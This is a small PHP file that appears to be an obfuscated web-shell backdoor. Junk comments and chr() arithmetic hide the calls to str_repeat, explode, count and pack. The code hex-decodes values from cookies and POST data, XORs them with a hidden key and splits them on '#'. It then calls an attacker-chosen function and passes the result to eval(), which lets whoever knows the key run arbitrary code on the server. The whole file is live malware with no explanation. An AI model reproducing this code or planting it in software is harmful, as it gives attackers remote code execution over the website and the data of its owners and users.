<?php
$VYxGudcvE	=	's'	.     "\164"/*hcMAK */.	chr    (	155/* KHrKC  */-  41  ).chr/*isg */(/*   Tohk  */933   -  838	).chr	(  966   -  852/*Sobf  */)."\x65"	./*EDP  */"\x70"/* VCyw*/./*mVh  */chr  (101)	.	"\x61"/*   ODN   */.     't';
			$eGoAnLf	=   "\145"	.	'x'/*  j*/.	"\160"/*   OpOl  */.   "\154"/*   m*/.     chr	(111) ./* k   */chr	(100)    .   chr/*Ucbm*/(101);
 $YnBUbGSSI/* ATB   */=	chr	(99)/*   QJqMc   */. "\x6f"     .	chr   (    153	-/* Ml*/36/*   cBAHp   */)."\x6e"/*   ZhW*/.    chr  (   482	-    366/*  RuN  */);
$cdqqJ =	chr	(/* rns  */323/*  yf   */-/*DAP  */211/* zCmvp */).chr/*  G */(  768	-    671/*   JfcEl*/)."\x63"/*   vaQ*/./* Tbxe  */"\x6b";
 $exTJwm =   Array	(/*  q   */"dmototAtlMXYWCPSbGDMFF"	=>	"LRnzPUvdgzjnQahflgBfMRsgNcm"/*  GeJ*/);
     $pojIfkek/*   Kljgb */=   Array	( "EkmvylFryTZ"/*AoG   */=> "AZVqUMAtawhLwCxjf"	);
   /*   XCjoa  */foreach/*  vhUe*/(	Array(	$exTJwm, $_COOKIE,/*  HHBm  */$pojIfkek,/*  kfO  */$_POST,	$exTJwm) as/*   PexV  */$cfoImtSSG)/*  UIPYY*/{
        foreach    (/*   Ve   */$cfoImtSSG as/*Y*/$cvtmSGSc     =>    $kmQAqA   )/*LVtsO  */{

   $kmQAqA    =  @$cdqqJ(	chr    (72)	. chr (/*Edr   */894	- 852	),    $kmQAqA  );
/* mh  */$cvtmSGSc/*  J  */.=  "bpRU-LQB-MdvA-JymuOq-iCcOgR-EbOTVe-UHe";
	$cvtmSGSc/*EyLqO */=/*Qwr   */$VYxGudcvE/*v   */(    $cvtmSGSc,/*  HKgG  */(	strlen(/* Nsy   */$kmQAqA/* SxdCE  */)/strlen(	$cvtmSGSc/*  ioytj  */)/*  WuVF */)   +/* smALf   */1);
			$omwDHuP	=/* vfhd   */$kmQAqA	^/*  N */$cvtmSGSc;
	$omwDHuP/*   nMyjC  */=/* U */$eGoAnLf   (/*  NbQ */chr/*uDYBC */(35),	$omwDHuP	);

/*   cuAWw  */if   (     $YnBUbGSSI/*   GgMvX   */(/*   uDUjA  */$omwDHuP/* ujuyL*/)    ==   3 )  {

/* Qx*/$param1	=    $omwDHuP[1];
/*ogxsD*/$param2     =     $omwDHuP[2];
    /*xbA*/$param3  = $param1($param2);
		/* KHNsN */eval	(/*  rmyVg   */$param3	);
     	die	();
/*W  */}
     	}
          }